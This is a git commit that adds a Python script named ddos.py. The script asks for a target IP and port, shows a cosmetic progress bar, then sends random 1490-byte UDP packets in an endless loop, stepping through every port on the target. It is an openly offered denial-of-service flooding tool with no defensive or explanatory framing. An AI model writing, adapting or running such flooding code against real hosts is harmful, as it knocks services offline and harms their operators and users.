b0984834b32bcde165f4bd18afd698f1f6473be9
Nawab Usama Bhatti <usama.fa19bcs069@outlook.com>
2022-11-18 09:08:00 +0500

    Add files via upload

---
+++ DDos-Attack/ddos.py
@@ -0,0 +1,43 @@
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+os.system("clear")
+os.system("figlet DDos Attack")
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print ("[                    ] 0% ")
+time.sleep(1)
+print ("[=====               ] 25%")
+time.sleep(1)
+print ("[==========          ] 50%")
+time.sleep(1)
+print ("[===============     ] 75%")
+time.sleep(1)
+print ("[====================] 100%")
+time.sleep(1)
+sent = 0
+sock.connect((ip, port)) 
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
+
